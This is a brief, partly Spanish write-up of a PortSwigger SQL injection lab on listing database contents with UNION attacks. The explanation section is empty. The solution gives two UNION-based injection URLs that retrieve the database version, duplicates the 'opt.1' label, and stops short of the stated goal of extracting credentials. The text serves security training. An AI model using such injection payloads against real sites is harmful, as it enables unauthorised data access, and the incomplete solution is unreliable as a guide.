# `LAB`: SQL injection attack, listing the database contents on non-Oracle databases

## Descripción:

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user. 

### Oracle Cheastsheet:

- [PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


---

### Explicación:




## Solución:

````py
## SQLi: Dumpear Version opt.1
.web-security-academy.net/filter?category=Pets' Union Select 1,version() -- -

## SQLi: Dumpear Version opt.1
.web-security-academy.net/filter?category=Pets' Union Select 1,@@version -- -
````
